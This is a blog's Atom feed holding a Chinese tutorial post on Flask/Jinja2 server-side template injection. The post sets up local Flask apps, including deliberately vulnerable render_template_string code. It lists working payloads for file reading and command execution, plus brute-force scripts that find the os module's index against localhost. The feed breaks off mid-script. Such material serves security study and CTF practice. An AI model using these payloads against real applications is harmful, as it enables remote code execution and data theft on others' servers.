<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BoyChai&#39;s Blog</title>
  
  
  <link href="https://blog.boychai.xyz/atom.xml" rel="self"/>
  
  <link href="https://blog.boychai.xyz/"/>
  <updated>2025-07-17T05:40:18.601Z</updated>
  <id>https://blog.boychai.xyz/</id>
  
  <author>
    <name>BoyChai</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>WEB-Flask模板注入总结</title>
    <link href="https://blog.boychai.xyz/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://blog.boychai.xyz/2025/07/02/WEB-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2025-07-02T20:17:00.000Z</published>
    <updated>2025-07-17T05:40:18.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境创建"><a href="#环境创建" class="headerlink" title="环境创建"></a>环境创建</h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n flask python=<span class="number">3</span>.<span class="number">11</span></span><br><span class="line">conda activate flask</span><br><span class="line">pip install flask</span><br></pre></td></tr></table></figure><h1 id="关于flask"><a href="#关于flask" class="headerlink" title="关于flask"></a>关于flask</h1><p>Flask是一个使用python编写的轻量级的Web应用框架，其WSGI工具采用werkzeug，模板引擎使用jinja2，后面的ssti基本都围绕这flask进行。</p><h2 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h2><p>下面简单的创建一个flask应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>此时用flask的环境去运行，会自动监在本地的<code>5000</code>端口，去访问会回显<code>Hello，World</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250627180217.png"></p><h2 id="参数传入"><a href="#参数传入" class="headerlink" title="参数传入"></a>参数传入</h2><p>传参的方法有很多种，这里简单列举几个比较常用的，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态URL传参 字符串</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello/&lt;name&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Hello, <span class="subst">&#123;name&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态URL传参 int</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/int/&lt;int:id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_id</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;int, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 动态URL传参 float</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/float/&lt;float:id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">float_id</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;float, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># form传参</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post_get&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_get_id</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;GET, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line">    <span class="built_in">id</span> = request.form[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;POST, <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="关于模板"><a href="#关于模板" class="headerlink" title="关于模板"></a>关于模板</h2><p>模板是为了将视图函数的业务逻辑和HTML 页面展示代码分离，提高代码的可维护性和可读性。通过使用模板引擎(Jinja2)，可以将动态数据插入到预定义的HTML 模板中，生成最终的HTML 页面，避免在视图函数中直接拼接HTML 字符串，从而使代码更加清晰和易于维护。﻿有些需求可能需要一个框架把前后端都写了，一般这种就需要使用模板了，下面进行模板的讲解，后面的模板注入也都是围绕这这个块内容进行的。在当前目录下创建一个<code>templates</code>的目录，flask的模板载入默认就是用当前工作目录的<code>template</code>下的文件，写一个<code>index.html</code>，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;Template&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;模板展示页&lt;/h1&gt;</span><br><span class="line">    &lt;h2&gt;字符串类型&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_str&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;h2&gt;整型&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_int&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;h2&gt;数组&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_array&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_array[0]&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;my_array[2]&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;h2&gt;字典&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;name:&#123;&#123;my_dict.name&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;age:&#123;&#123;my_dict.age&#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后运行下面代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    my_str = <span class="string">&quot;hello template&quot;</span></span><br><span class="line">    my_int = <span class="number">12</span></span><br><span class="line">    my_array = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    my_dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;moban&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;index.html&quot;</span>, my_str=my_str, my_int=my_int, my_array=my_array, my_dict=my_dict</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时访问返回的内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250627185529.png"></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>模板注入漏洞简称SSTI，以flask为例，如果代码不严谨造成此漏洞可能会导致造成任意文件读取和RCE，漏洞的成因一般都是在渲染模板的时候没有严格对用户的输入做控制，或者使用了危险的模板导致用户可以和flask程序进行交互。下面看一个安全的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;&#123;str&#125;&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str, <span class="built_in">str</span>=<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里进行输入任何的数据都不会进行计算，而是直接进行渲染，可以尝试参数<code>7*7</code>，后面看一个有问题的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">str</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个代码会因为输入的数据而直接修改模板，然后再最终会被模板加载，如果我们在修改模板的时候注入一些计算，例如payload<code>&#123;&#123;7*7&#125;&#125;</code>那么他会直接返回47，这个位置就存在模板注入漏洞。也可以通过下面payload来测试指令的执行<code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250627195103.png"></p><h1 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h1><p>在仔细学习flask的ssti前，先学习一下python的类继承关系，后面利用漏洞的时候可以方便理解一些小技巧。首先在代码中写入下面内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = C()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C的当前类:&quot;</span>, c.__class__)</span><br><span class="line"><span class="comment"># 父类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C的父类:&quot;</span>, c.__class__.__base__)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B的父类:&quot;</span>, c.__class__.__base__.__base__)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A的父类:&quot;</span>, c.__class__.__base__.__base__.__base__)</span><br><span class="line"><span class="comment"># 直接获取父类链(可以当数组用)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;C的父类链:&quot;</span>, C.__mro__)</span><br><span class="line"><span class="comment"># 查看子类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;通过C查看B的所有子类:&quot;</span>, C.__mro__[<span class="number">1</span>].__subclasses__())</span><br></pre></td></tr></table></figure><p>这些方法的作用如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__class__ <span class="comment"># 查找当前类型的所属对象</span></span><br><span class="line">__base__  <span class="comment"># 查找自己的父类</span></span><br><span class="line">__mro__   <span class="comment"># 查找父类链</span></span><br><span class="line">__subclasses__ <span class="comment"># 查看当前类下的所有子类</span></span><br></pre></td></tr></table></figure><p>学习了这些内容之后我们可以看一个存在漏洞的案例，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">str</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>我们可以尝试获取一下最父类<code>object</code>看一下可以用来执行命令的子类，payload可以用<code>str=&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;</code>含义是获取字符串类<code>string</code>的父类<code>object</code>下的所有子类，然后他会列出很多很多的数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160325.png"><br>这些数据我们复制出来替换一下<code>,</code>为换行，我们就可以直观的知道他们每一个的数组索引，然后我们在148行发现下面这个类<code>os._wrap_close</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160453.png"><br>这个类可以执行命令还有执行代码，一般都会存在这个，索引不固定，但是有些题目可能会禁用掉，这个就得考虑别的了，我们可以使用下面payload获取到这个类<code>str=&#123;&#123;''.__class__.__base__.__subclasses__()[147]&#125;&#125;</code>，147的原因是因为python默认是从0计算索引的，vsc中是从1开始，然后我们可以通过下面的payload来查看一下他是否已经被初始化了<code>str=&#123;&#123;''.__class__.__base__.__subclasses__()[147].__init__&#125;&#125;</code><br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160741.png"><br>返回出一个地址即成功，如果是其他的那就说明不能直接使用。继续的我们看一下这个类中所有可用的方法和变量，通过下面payload获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">147</span>].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>同样的返回值会是一大片数据<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628160943.png"><br>他这里返回数据的方式是字典，我们一般直接去搜索<code>system</code>、<code>eval</code>、<code>popen</code>这些比较危险的函数试试，如果有我们这里可以直接使用，例如<code>eval</code>的使用，payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">147</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628162054.png"></p><h1 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>文件读取用的object的子类是<code>_frozen_importlib_external.FileLoader</code>，简单的利用payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;get_data&quot;</span>](<span class="number">0</span>,<span class="string">&quot;flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628165651.png"></p><h2 id="eval命令执行"><a href="#eval命令执行" class="headerlink" title="eval命令执行"></a>eval命令执行</h2><p>参考上面简单利用的案例，需要用到的是<code>os._wrap_close</code>类，这里给一个payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="os命令执行"><a href="#os命令执行" class="headerlink" title="os命令执行"></a>os命令执行</h2><p>直接调用os模块可以使用下面的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628170243.png"><br>还有其他的方式，其他的主要是通过加载过os模块的类去使用os模块，下面也简单介绍一下，以简单利用的环境为例，编写下面脚本来寻找<code>os.py</code>模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;str&quot;</span>: <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="comment"># response = requests.post(url, params=data)</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;os.py&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>相同的这个脚本也适用于寻找其他模块，具体利用可以直接拼接os模块即可，如下payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引].__init__.__globals__.os.popen(<span class="string">&#x27;dir&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>PS：有些模块似乎无法使用，了解当前方法即可。</p><h2 id="importlib命令执行"><a href="#importlib命令执行" class="headerlink" title="importlib命令执行"></a>importlib命令执行</h2><p>这个需要利用<code>_frozen_importlib.BuiltinImporter</code>模块，一般他可以直接在<code>objsct</code>的子类中存在，具体利用payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;dir&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="linecache命令执行"><a href="#linecache命令执行" class="headerlink" title="linecache命令执行"></a>linecache命令执行</h2><p><code>linecache</code>函数可以用来读取任意一个文件的某一行，而且他也引入了os模块，我们可以直接利用他去执行命令，他也是需要去搜索的，具体脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;str&quot;</span>: <span 